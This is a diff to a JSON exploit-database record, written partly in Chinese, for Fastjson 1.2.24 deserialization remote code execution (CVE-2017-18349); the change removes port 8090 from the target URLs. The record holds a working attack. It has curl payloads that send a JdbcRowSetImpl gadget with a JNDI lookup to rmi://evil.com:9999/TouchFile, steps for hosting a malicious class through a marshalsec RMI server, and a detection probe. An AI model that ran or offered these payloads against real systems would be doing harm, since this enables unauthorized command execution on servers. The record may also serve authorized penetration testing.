@@ -23,7 +23,7 @@
   "common_endpoints": [
     "/"
   ],
-  "detection_method": "发送一个包含@type字段的JSON POST请求到目标，观察响应是否包含fastjson相关错误或正常处理，例如：curl -X POST http://{TARGET}:8090/ -H \"Content-Type: application/json\" --data '{\"@type\":\"java.lang.Class\"}'，如果返回错误或特定响应，可能表示存在漏洞",
+  "detection_method": "发送一个包含@type字段的JSON POST请求到目标，观察响应是否包含fastjson相关错误或正常处理，例如：curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" --data '{\"@type\":\"java.lang.Class\"}'，如果返回错误或特定响应，可能表示存在漏洞",
   "exploit_steps": [
     {
       "step": 1,
@@ -42,12 +42,12 @@
     {
       "step": 3,
       "description": "向目标服务器发送包含恶意JdbcRowSetImpl的JSON payload，触发JNDI注入执行命令",
-      "command": "curl -X POST http://{TARGET}:8090/ -H \"Content-Type: application/json\" --data '{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\"autoCommit\":true}}'",
+      "command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" --data '{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\"autoCommit\":true}}'",
       "expected_result": "命令执行成功，例如在目标服务器上创建/tmp/success文件",
       "notes": "evil.com和端口9999需与步骤2中RMI服务器配置一致，目标地址用{TARGET}占位"
     }
   ],
-  "verification_command": "curl -X POST http://{TARGET}:8090/ -H \"Content-Type: application/json\" --data '{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\"autoCommit\":true}}'",
+  "verification_command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" --data '{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\"autoCommit\":true}}'",
   "verification_success_sign": "目标服务器上执行了指定命令，如创建/tmp/success文件，可通过后续检查或日志确认",
   "requires_callback": true,
   "callback_note": "需要目标回连攻击机的RMI服务器以加载恶意类，因为利用链依赖JNDI注入。替代方案：如果目标环境有trustURLCodebase限制，可能需要使用本地类路径或其它利用链，但资料中未提供具体变体",
@@ -60,7 +60,7 @@
     "java",
     "cve-2017-18349"
   ],
-  "search_text": "Fastjson 1.2.24 在解析JSON时支持autoType实例化特定类，通过构造恶意利用链实现远程命令执行 java_deserialization CVE-2017-18349 fastjson 1.2.24 CVE-2017-18349 fastjson 1.2.24 fastjson deserialization fastjson rce fastjson alibaba json parser Content-Type: application/json 发送一个包含@type字段的JSON POST请求到目标，观察响应是否包含fastjson相关错误或正常处理，例如：curl -X POST http://{TARGET}:8090/ -H \"Content-Type: application/json\" --data '{\"@type\":\"java.lang.Class\"}'，如果返回错误或特定响应，可能表示存在漏洞 Fastjson 1.2.24 fastjson deserialization rce jndi java cve-2017-18349 编译并上传恶意Java类文件到攻击者控制的服务器，例如TouchFile.class，用于执行命令 使用marshalsec启动RMI服务器，监听指定端口并加载远程恶意类 向目标服务器发送包含恶意JdbcRowSetImpl的JSON payload，触发JNDI注入执行命令",
+  "search_text": "Fastjson 1.2.24 在解析JSON时支持autoType实例化特定类，通过构造恶意利用链实现远程命令执行 java_deserialization CVE-2017-18349 fastjson 1.2.24 CVE-2017-18349 fastjson 1.2.24 fastjson deserialization fastjson rce fastjson alibaba json parser Content-Type: application/json 发送一个包含@type字段的JSON POST请求到目标，观察响应是否包含fastjson相关错误或正常处理，例如：curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" --data '{\"@type\":\"java.lang.Class\"}'，如果返回错误或特定响应，可能表示存在漏洞 Fastjson 1.2.24 fastjson deserialization rce jndi java cve-2017-18349 编译并上传恶意Java类文件到攻击者控制的服务器，例如TouchFile.class，用于执行命令 使用marshalsec启动RMI服务器，监听指定端口并加载远程恶意类 向目标服务器发送包含恶意JdbcRowSetImpl的JSON payload，触发JNDI注入执行命令",
   "embedding": [
     0.1868869960308075,
     -0.12577247619628906,
